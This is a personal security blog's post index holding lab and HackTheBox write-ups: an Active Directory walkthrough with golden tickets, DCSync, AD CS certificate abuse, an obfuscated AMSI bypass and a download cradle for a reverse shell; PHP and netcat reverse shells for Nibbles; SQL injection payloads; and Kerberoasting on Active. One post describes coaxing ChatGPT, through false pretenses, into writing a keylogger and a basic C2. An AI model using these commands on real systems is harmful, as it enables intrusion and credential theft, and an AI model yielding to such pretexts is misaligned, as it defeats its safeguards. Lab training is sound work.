/impersonateuser:administrator /pttThen check if we can access dcorp-mgmt withwinrs -r:dcorp-mgmt cmdwhoamihostnameLearning Objective 18Using DA access to dollarcorp.moneycorp.local, escalate privileges to EA or DA to the parent domain, moneycorp.local using the domain trust key. We can retreive the trust key between dollarcorp and moneycorp using mimikatz or safetykatz. Start a process with DA privileges by running the below command from an elevated prompt:C:\\AD\\Tools\\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /pttThen use the below commands from the process running as DA to copy loader.exe on dcorp-dc and use it to extract credentialsecho F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dcorp-dc\\C$\\Users\\Public\\Loader.exe /Ywinrs -r:dcorp-dc cmdnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.20C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exelsadump::trust /patchIn this case the aes256 hmac for the dollarcorp.moneycorp.local to moneycorp.local trust is 556d040b71b7fc20aa043027b19a3dafc6dbffdb7968966e66200c3f5683e56aand the rc4 is f7277dcaf640d00ddd2744143b346c36We will use it to forge a ticket with the SID history of EA admins by running the below command from an elevated command prompt on the student VMC:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4: f7277dcaf640d00ddd2744143b346c36 /service:krbtgt /target:moneycorp.local /ticket:C:\\AD\\Tools\\trust_tkt.kirbi\" \"exit\"if all is good, you should see \"Final ticket saved to file !\"We can use rubeus to use this ticket as suchC:\\AD\\Tools\\Rubeus.exe asktgs /ticket:C:\\AD\\Tools\\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /pttThen check if we can access the file system on mcorp-dc as suchdir \\\\mcorp-dc.moneycorp.local\\c$Using Invoke-Mimi and Old Kekeostarting with the DA processpowershell -ep bypasscd C:\\AD\\Tools\\$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.localEnter-PSSession -Session $sessS`eTIt`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE](\"{1}{0}\"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( \"{2}{4}{0}{1}{3}\" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} )exitInvoke-Command -FilePath C:\\AD\\Tools\\Invoke-Mimi.ps1 -Session $sessEnter-PSSession -Session $sessInvoke-Mimi -Command '\"lsadump::trust /patch\"'Then create the inter-realm TGT by running the below command on your machine using the rc4_hmac_nt of dollarcorp.moneycorp.local -&gt; moneycorp.localInvoke-Mimi -Command '\"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:132f54e05f7c3db02e97c00ff3879067 /service:krbtgt /target:moneycorp.local /ticket:C:\\AD\\Tools\\kekeo_old\\trust2_tkt.kirbi\"'Then, create a TGS for a service in the parent domain (asktgs is in \\AD\\Tools\\kekeo_old).\\asktgs.exe C:\\AD\\Tools\\kekeo_old\\trust2_tkt.kirbi CIFS/mcorp-dc.moneycorp.localPresent the TGS to the target service.\\kirbikator.exe lsa .\\CIFS.mcorp-dc.moneycorp.local.kirbiNow try to access the target service, a success means escalation to the parent DAls \\\\mcorp-dc.moneycorp.local\\c$Learning Objective 19Using DA access to dollarcorp.moneycorp.local, escalate privileges to EA or DA to the parent domain, moneycorp.local using dollarcorps krbtgt hash. Let’s create the inter-realm TGT and inject it by running the below command from an elevated command prompt:C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt\" \"exit\"Then check if we can access moneycorp DCdir \\\\mcorp-dc.moneycorp.local\\c$If we get output, all is good. Let’s run DCSync attack against mcorp-dc to extract it’s secrets:C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:mcorp\\krbtgt /domain:moneycorp.local\" \"exit\"Learning Objective 20With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest. We need the trust key for the trust between dollarcorp and eurocorp, which we can get with mimikatz or safetykatz. Start a process with DA privileges with Rubeus:C:\\AD\\Tools\\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /pttUsing SafetyKatz.exeRun the below commands from the process running as DA to copy loader.exe to dcorp-dc and use it to extract the trust keyecho F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dcorp-dc\\C$\\Users\\Public\\Loader.exe /Ywinrs -r:dcorp-dc cmdnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.20C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exelsadump::trust /patchThen run the below command from an elevated command prompt using the rc4 hash extracted earlier to create the ticketC:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:163373571e6c3e09673010fd60accdf0 /service:krbtgt /target:eurocorp.local /ticket:C:\\AD\\Tools\\trust_forest_tkt.kirbi\" \"exit\"Then use the ticket with RubeusC:\\AD\\Tools\\Rubeus.exe asktgs /ticket:C:\\AD\\Tools\\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /pttand check if we have access usingdir \\\\eurocorp-dc.eurocorp.local\\SharedwithDCorp\\Using Invoke-Mimikatz and old KekeoWith DA privileges from earlier, run the following command to retrieve the trust key for the trust between dollarcorp and eurocorpInvoke-Mimi -Command '\"lsadump::trust /patch\"' -ComputerName dcorp-dc.dollarcorp.moneycorp.localCreate the inter-realm TGTInvoke-Mimi -Command '\"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:163373571e6c3e09673010fd60accdf0 /service:krbtgt /target:eurocorp.local /ticket:C:\\AD\\Tools\\kekeo_old\\trust_forest_tkt.kirbi\"'then use asktgs in the kekeo_old directory as such.\\asktgs.exe C:\\AD\\Tools\\kekeo_old\\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.localPresent the TGS to the CIFS service.\\kirbikator.exe lsa .\\CIFS.eurocorp-dc.eurocorp.local.kirbiand check if we have access withls \\\\eurocorp-dc.eurocorp.local\\SharedwithDCorp\\Learning Objective 21Check if AD CS is used by the target forest and find any vulnerable or abusable templates, if so then abuse the template to escalate to DA and EA. We can use Certify.exe to check for AD CS in moneycorp.C:\\AD\\Tools\\Certify.exe casThen we can list all the templates using the “find” commandC:\\AD\\Tools\\Certify.exe findC:\\AD\\Tools\\Certify.exe find /enrolleeSuppliesSubjectWe see the HTTPSCertificates looks interesting, as the msPKI-Certificates-Name-Flag is Enrollee_Supplies_Subject and the enrollment rights contains dcorp/RDPUsers, which we know our student is a member of this group. This means we can request a certificate for any user as the student, we’ll use the below command to request a certificate for a domain admin.C:\\AD\\Tools\\Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:\"HTTPSCertificates\" /altname:administratorCopy all the text between —–BEGIN RSA PRIVATE KEY—– and —–ENDCERTIFICATE—– and save it to esc1.pem. We need to convert it to PFC to use it. We can use the openssl binary on our student VM to do that.C:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in C:\\AD\\Tools\\esc1.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out C:\\AD\\Tools\\esc1-DA.pfxand enter a password when prompted. Then we can use rubeus to request a TGT for DA administrator.C:\\AD\\Tools\\Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /pttCheck if we have DA privilegeswinrs -r:dcorp-dc whoamicool, we can use a similar method to escalate to EA, by requesting a certificate for the EA accountC:\\AD\\Tools\\Certify.exe request /ca:mcorpdc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:\"HTTPSCertificates\" /altname:moneycorp.local\\administratorAnd do the same thing shown earlier to extract the key and convert it to PFXC:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in C:\\AD\\Tools\\esc1-EA.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out C:\\AD\\Tools\\esc1-EA.pfxUse Rubeus again to request TGT for EA.C:\\AD\\Tools\\Rubeus.exe asktgt /user:moneycorp.local\\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /pttand check our access withwinrs -r:mcorp-dc whoamiPrivilege Escalation to DA and EA using ESC3If we list vulnerable templates in moneycorp using this command:C:\\AD\\Tools\\Certify.exe find /vulnerableWe can see that the SmartCardEnrollment-Agent template has EKU for Certificate Request Agents, and grants enrollment rights to domain users. If we can find another template that has an EKU that allows for domain authentication and has application policy requirement of the certificate request agent, we can request certs on behalf of any user. use the find command again and look for application policies with the certificate request agent. In this case SmartCardEnrollment-Users has enrollment rights for dcorp\\Domain Users.We can request an enrollment agent certificate from the template “SmartCardEnrollment-Agent”C:\\AD\\Tools\\Certify.exe request /ca:mcorpdc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-AgentAnd like earlier, save the certificate to esc3.pem and convert it to pfx and set a password for it.C:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in C:\\AD\\Tools\\esc3.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out C:\\AD\\Tools\\esc3-agent.pfxThen we can use the Enrollment Agent Certificate to request a certificate for DA from the template SmartCardEnrollment-UsersC:\\AD\\Tools\\Certify.exe request /ca:mcorpdc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\\administrator /enrollcert:C:\\AD\\Tools\\esc3-agent.pfx /enrollcertpw:SecretPass@123Once again, save this cert as esc3-DA.pem and convert it to pfx.``powershellC:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in C:\\AD\\Tools\\esc3-DA.pem -keyex -CSP “Microsoft Enhanced Cryptographic Provider v1.0” -export -out C:\\AD\\Tools\\esc3-DA.pfxAnd use the esc3-DA.pfx created above with Rubeus and request a TGT for DA```powershellC:\\AD\\Tools\\Rubeus.exe asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /pttCheck if we have DA withwinrs -r:dcorp-dc whoamiTo escalate to Enterprise Admin, we just need to change the request to SmartCardEnrollment-Users template with Rubeus. Note that we are using ‘/onbehalfof: mcorp\\administrator’ hereC:\\AD\\Tools\\Certify.exe request /ca:mcorpdc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\\administrator /enrollcert:C:\\AD\\Tools\\esc3-agent.pfx /enrollcertpw:SecretPass@123Once more, convert it to esc3-EA.pfx using openssl and use rubeusC:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in C:\\AD\\Tools\\esc3-EA.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out C:\\AD\\Tools\\esc3-EA.pfxC:\\AD\\Tools\\Rubeus.exe asktgt /user:moneycorp.local\\administrator /certificate:C:\\AD\\Tools\\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /pttThen access mcorp-dcwinrs -r:mcorp-dc whoamiPrivilege escalation to DA and EA using ESC6C:\\AD\\Tools\\Certify.exe casAnd we are looking for[!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees canspecify Subject Alternative Names!This means we can request a certificate for ANY user from a template that will allow enrollment for normal or low-priv users.C:\\AD\\Tools\\Certify.exe findAnd we see again the RDPUsers have Enrollment Rights in the CA-Integration template. As a member of the RDPUsers group, we can request a certificate for any user using CA-Integration template. for EA, use /altname:moneycorp.local\\administrator, and for DA use the below commandC:\\AD\\Tools\\Certify.exe request /ca:mcorpdc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:\"CA-Integration\" /altname:administratorSave it to esc6-DA and convert it to pfx using OpenSSL, then use rubeus once again to request a TGT for DAC:\\AD\\Tools\\Rubeus.exe asktgt /user:administrator /certificate:C:\\AD\\Tools\\esc6-DA.pfx /password:SecretPass@123 /pttwinrs -r:dcorp-dc whoamiLearning Objective 22In this objective we get a reverse shell on the SQL server in eurocorp forest by abusing database links from dcorp-mssql. We start with enumerating SQL servers in the domain and see if our student account has privileges to connect to any of them. We can use the PowerUpSQL module as shown below after starting invisishell:Import-Module C:\\AD\\Tools\\PowerUpSQL-master\\PowerupSQL.psd1Get-SQLInstanceDomain | Get-SQLServerinfo -VerboseWe can then use Get-SQLServerLinkCrawl for crawling database links automatically.Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -VerboseIf XP_cmdshell is enabled, it is possible to execute commands on eu-sql using linked databases.Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query \"exec master..xp_cmdshell 'whoami'\"Let’s execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the eu-sql instance. Remember to start a listener first withC:\\AD\\Tools\\netcat-win32-1.12\\nc64.exe -lvp 443Then runGet-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c \"iex (iwr -UseBasicParsing http://172.16.100.20/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.20/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.20/Invoke-PowerShellTcpEx.ps1)\"''' -QueryTarget eu-sql" }, { "title": "Nibbles", "url": "/posts/Nibbles/", "categories": "htb", "tags": "Linux, Malicious File Upload, Path Injection", "date": "2023-02-08 14:27:00 -0600", "snippet": "Nibbles is an easy level Linux machine on HacktheBox. We start by getting a foothold by guessing user credentials for a blog site, and finding out we can upload and execute arbitrary PHP files. Using this to get a reverse shell, we then elevate to root priveleges by re-writing a script that the user has access to run as root.As always we run an Nmap on the targetJust 22, and 80, let’s poke around the website.The homepage is just a static html page, but it’s telling us to check out /nibbleblog/Visiting this page shows us the front page of what appears to be a blog, and at the bottom left it tells us this is made with nibbleblog.Running gobuster in this directory shows some interesting endpoints, admin and admin.php.the /Admin and /content pages have a layout of the websites files. We can’t really do anything with this currently and there is no interesting information leaked, but we’ll remember this if it’s useful later on.The /admin.php page shows us a login page, but we have to becareful here, if we try to bruteforce this login page we’ll get blacklisted by some type of WAF or something.We can wait a few minutes, or revert the machine to get back to the login page. It turns out this password can be guessed, and we can login with the credentials admin:nibbles.If we go to the settings page, we can see that the site is running nibbleblog version 4.0.3, which we found an authenticated arbritrary php file upload vulnerability on github for.This exploit works because you can upload any file via the “my image” plugin, and the extension will not be checked, thus it is possible to upload php files and get code execution. Let’s use msfvenom to create our payload.msfvenom -p php/reverse_php LHOST=10.10.14.14 LPORT=1337 -f raw -o shell2.phpWe upload the shell, and ignore the errors at the top. Remember how we could visit /content and /admin to view the web structure? We’ll need to go there and navigate to our shell to get the web server to exectue it, after setting up a netcat listener of course.We browse to the plugin’s content directory, and click on the image.php file, the connection hangs and we get a hit on our listener.For some reason this shell is extremely unstable, and disconnects after a short period. We’ll use a netcat reverse shell instead by setting up a new listener, and throwing this payload into our php reverse shell.rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 1338 &gt;/tmp/fWe get a hit on our 2nd listener.Checking our sudo privleges on the box shows us:We can run monitor.sh, which exists inside of the “nibbler” user’s home directory, we just need to unzip personal.zip to see it.We could read this script and find out what it’s doing, or we can just edit it to do whatever we want, as we have write access to the file.We’ll overwrite the file by echoing ‘#!/bin/bash’ to monitor.sh, so the shell script “knows where to go”, then append the command we want to run, which is /bin/bash. We make it executable with chmod +x and run the new shell script with sudo, giving us a root shell!" }, { "title": "Port Swigger Academy Notes", "url": "/posts/PortSwigger/", "categories": "Port Swigger", "tags": "Educational", "date": "2023-02-02 21:19:00 -0600", "snippet": "SQL InjectionWhat is SQL InjectionSQL injection is a vulnerability which allows an attacker to interfere with the queries that an application makes to its database. An attacker can exploit this vulnerability to obtain, modify, or delete sensitive information, and in some cases it can be used to gain access to the back-end infrastructure.Common SQL Injection AttacksRetreiving Hidden DataConsider the URL:https://insecure-website(.)com/products?category=Giftswhich causes the application to make the SQL querySELECT * FROM products WHERE category = 'Gifts' AND released = 1This query will return all the products in the Gift category that are released. Now consider that the application is not properly sanitizing user input, and an attacker sends this request to the server.https://insecure-website.com/products?category=Gifts'--Which changes the query toSELECT * FROM products WHERE category = 'Gifts'--' AND released = 1The double dash sequence is a comment indicator in SQL, and means that the rest of the query will not get interpreted, and effectively removes the AND released = 1, showing the attacker both the unreleased and released products.Furthermore, an attacker could sendhttps://insecure-website.com/products?category=Gifts'+OR+1=1--Which modifies the query to look likeSELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1This query will return items where the category = Gifts, or 1=1, which is always true. Meaning the query will return ALL items.Subverting Application LogicConsider now an application that allows users to login with their username/password combination using the following SQL query:SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'Here an attacker could login as any user (given they know the username) by submitting administrator'-- into the username field, and leaving the password field blank. The query then looks likeSELECT * FROM users WHERE username = 'administrator'--' AND password = ''Which would successfuly log the attacker in as “administrator”, assuming that is a valid username.Retrieving Data from Other Database TablesIn cases where the results of an SQL query are returned within the application’s response, an attacker can use the UNION operator to retrieve data from other tables within the databse. For example, if an application uses the following query containing the user input “Gifts”SELECT name, description FROM products WHERE category = 'Gifts'an attacker could submit the input' UNION SELECT username, password FROM users--which will cause the application to return all usernames and passwords, as well as descriptions of the gift products.Examing the DatabaseAfter determining that an application is vulnerable to SQL injection, it is useful to know more information about what kind of database is running. This heavily depends on the database type. You can also determine what database tables exist on most databases usingSELECT * FROM information_schema.tablesBlind SQL InjectionAlot of SQL vulnerabilities in the wild will be blind, meaning the server will not return the results of the SQL query or any associated errors. Depending on the nature of the vulnerability, you can discover these by changing the logic of the query to trigger a detectable difference in the applications response (causing it to error out), or conditionally triggering a time delay.Detecting SQL InjectionTo test for SQL injection manually, every single field that accepts user input can be tested. This can involve: Submitting a single quote, and looking for errors. (the single quote might break the syntax of the SQL query) Submitting some SQL specific syntax that evaluates to the original value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses. Submitting Boolean conditions such as OR 1=1 or OR 1=2 and looking for differences in the application’s responses. Submitting payloads that are designed to trigger time delays, these are different depending on which database the application is using (enumerate, enumerate, enumerate)" }, { "title": "Getting ChatGPT to Write Malware with False Pretenses", "url": "/posts/ChatGPT/", "categories": "Educational", "tags": "Educational", "date": "2023-02-02 21:19:00 -0600", "snippet": "So recently I was looking into a keylogger script written by my brother, and I was wondering if I could recreate a similar script using chatGPT. Obviously, the creators of this AI tool do not want it to write malicious code, however, if you know how to ask it in the right way, it can write almost anything! For example, if I ask it to write me a simple keylogger, this is its response:Even if you insist that you are doing it with permission and that it is for ethical purposes, it just respondsI apologize, but as an AI language model created by OpenAI, I cannot fulfill your request to write code for unethical or potentially harmful purposes. Additionally, as a machine, I cannot grant or receive permissions.However, for some reason when I ask it this way, it obliges.We can then modify the script piece by piece until we get the desired functionality,though it can be a bit finicky at times.After some trial and error, we get a very simple keylogger script that can send results to a remote server. This is what it looks like.On the Right pane, we setup a simple HTTP listener with python. Then in the top left pane, we run the script provided to us by chatGPT. in the bottom left pane, we type “hello” and hit enter. The response sent to the server is visible in the right pane, however it is not human readable at all, this is what it looks like just when typing “hello”\"GET /log_keystrokes?data=Key.ctrlb%20%5B'b'%20released%5D%20%5BKey.ctrl%20released%5DKey.down%20%5BKey.down%20released%5Dh%20%5B'h'%20released%5De%20%5B'e'%20released%5Dl%20%5B'l'%20released%5Dl%20%5B'l'%20released%5Do%20%5B'o'%20released%5D HTTP/1.1\" 404 -If you look closely, you can see the individual ‘h’ ‘e’ ‘l’ ‘l’ ‘o’. Now I am no regex wizard, but luckily chatGPT is. We can ask it to write us an (extremely) basic “c2” server that can handle this request and make it human readable by asking the bot nicely:By running this “listener” script that we asked it to write, we can now get a clearer output.Same as last time, we run the listener on the right pane, run the keylogger on the top left, and type hello in the bottom left and hit enter to send off the request. This time our server is doing some regex magic to make the request look like this:It’s still a little messy, especially with how it deals with certain keys (like shift and ctrl), but it’s much more human-readable now, and we have a semi-functional keylogger, written 100% by chatGPT. Let’s take it another step and see if we can get it to write us a SUPER basic c2c. Mind you, a fully functioning c2c will have many features, it will be able to handle connections with multiple “victim” machines, generate payloads,handle these “victim” machines and task them to do stuff, and ideally this would all be encrypted/obfuscated. Let’s see if we can get it to write us 2 simple “commander” and “agent” scripts that can be used to run commands remotely, nothing crazy, but definitely something that is supposed to trigger an alarm in the AI. Let’s get a baseline for how it reacts-Obvioulsy this request is rejected. We will now feed it the 2 scripts that it had previously written for the keylogger (client and listener). We give it the pretense that one script is to be run on my brother’s computer with his permission, and the other script is to be run on my computer, then I tell it that I want to add the functionality of being able to send commands to his computer, and receive the output on mine.Again, the scripts were a little finicky and the bot needed some guidance to get it to do exactly what I wanted, but the end result is:You can see that the “commander” script on the right pane prompts the user for commands, and the “soldier” script executes that command, and sends the output back to the “commander” server. Again, this is no where close to a real, fully functioning C2 server, rather I just wanted to do a POC on how the bot can be made to do things it doesn’t want to! It goes without saying that none of these scripts would really be considered “real malware”, and they would be completely useless in real engagements, as 0 OPSEC precautions were taken, this is meant for educational purposes only." }, { "title": "Active", "url": "/posts/Active/", "categories": "htb", "tags": "Windows, Outdated Software, GPP, Password Cracking, Kerberoast, Hash Capture, Anonymous Access", "date": "2023-01-23 10:30:00 -0600", "snippet": "Active is an easy level Windows machine on HacktheBox which starts with enumerating an SMB share on a domain controller to find an encrypted gpp password, which we can decrypt and get access to the domain as a low priveleged user, we then find that the Administrator account can be Kerberoasted, giving us full access to the DC.EnumerationNmap shows us# Nmap 7.93 scan initiated Wed Jan 25 21:02:22 2023 as: nmap -sC -sV -p- -oN nmap.out 10.10.10.100Nmap scan report for active.htb (10.10.10.100)Host is up (0.049s latency).Not shown: 65512 closed tcp ports (reset)PORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2SP1)| dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-01-26 02:03:19Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5722/tcp open msrpc Microsoft Windows RPC9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPC49165/tcp open msrpc Microsoft Windows RPC49170/tcp open msrpc Microsoft Windows RPC49171/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsOur trusty nmap script gave us tons of info, the open ports (53,88,139,389,445) tell us we will be attacking a domain controller, which nmap has found is named DC.active.htb, so we’ll add DC.active.htb and active.htb to our /etc/hosts file. We can poke around SMB to check if there’s any non-standard shares, we can expect to atleast see SYSVOL, NETLOGON, and some admin shares (though we probably won’t be able to read the contents). We can use smbclient -l to list the shares which shows us:smbclient -L //10.10.10.100/ Password for [WORKGROUP\\kali]:Anonymous login successful Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk Reconnecting with SMB1 for workgroup listing.If we try to go inside any of these, we get tree connect failed: NT_STATUS_ACCESS_DENIED except for the Replication share. Let’s download the entire share to our machine with:└─$ smbclient //10.10.10.100/Replication/Password for [WORKGROUP\\kali]:Anonymous login successfulTry \"help\" to get a list of possible commands.smb: \\&gt; recurse onsmb: \\&gt; prompt offsmb: \\&gt; mget *There’s not much, but we do find a Groups.xml file, which contains a username and encrypted “cpassword”. Sysadmins used to be able to set user passwords via Group Policy with cpasswords, until Microsoft patched it in 2014 and blocked usage of the cpassword in new policies, which is cool, but they also leaked the decryption key on their support site. We can use a default kali tool “gpp-decrypt” to decrypt the password. Anyways this is what the groups.xml file looks like.└─$ cat /home/kali/htb/Active/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;&lt;/Groups&gt;Decrypting the cpassword gives us the credentials SVC_TGS:GPPstillStandingStrong2k18, which lets us grab the user flag withsmbclient //10.10.10.100/Users/ -U \"SVC_TGS\"We can also use some tools from the Impacket suite to interact with the domain../GetADUsers.py -all active.htb/svc_tgs:GPPstillStandingStrong2k18Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Querying active.htb for information about domain.Name Email PasswordLastSet LastLogon -------------------- ----------------------------- ------------------- -------------------Administrator 2018-07-18 15:06:40.351723 2023-01-25 18:58:13.159750 Guest &lt;never&gt; &lt;never&gt; krbtgt 2018-07-18 14:50:36.972031 &lt;never&gt; SVC_TGS 2018-07-18 16:14:38.402764 2023-01-26 12:25:29.633317 We can see if any users are kerberoastable by requesting service tickets from the domain controller with the GetUserSPNS.py script../GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -requestWhich gives us an administrator hash we can crack using john.john hash.txt --show ?:Ticketmaster1968We can then use psexec to get a shell with these credentials./psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Requesting shares on 10.10.10.100.....[*] Found writable share ADMIN$[*] Uploading file TACcfYCj.exe[*] Opening SVCManager on 10.10.10.100.....[*] Creating service xJWe on 10.10.10.100.....[*] Starting service xJWe.....[!] Press help for extra shell commandsMicrosoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt; whoamint authority\\system" }, { "title": "Shocker", "url": "/posts/Shocker/", "categories": "htb", "tags": "Linux, Outdated Software, Shell Shock, Path Injection, RCE, cgi-bin, perl", "date": "2023-01-17 08:47:00 -0600", "snippet": "Shocker is a fun easy level linux machine on HacktheBox which features the shellshock exploit to get a foothold on the box, and from there we escalate privileges by abusing sudo privileges in perl.EnumerationNmap shows us-With only HTTP and SSH to look at, let’s begin with enumerating the website.The website is just a static HTML page, we can find hidden web directories using gobuster. It’s important to note that only the directory with the trailing slash is validWith the trailing slash this time we get a 403 forbiddenCGI stands for “Common Gateway Interface”, and is esentially a folder in apache that houses scripts. The client sends a request to the server, the web server recieves the request and passes it to the CGI program, then the program executes and passes the output back to the web server, and the web server passes something back to the client. Common extensions for these scripts are .pl, .sh, .cgi, .py, and so on.If we use gobuster like this: /usr/bin/gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh,cgi,pl we can look for any potential scripts in the /cgi-bin/ directory with those file extensions.We see that user.sh exists on the server. Visiting the /cgi-bin/user.sh filepath downloads a text file for us, which is just the output of the uptime command.Googling around about 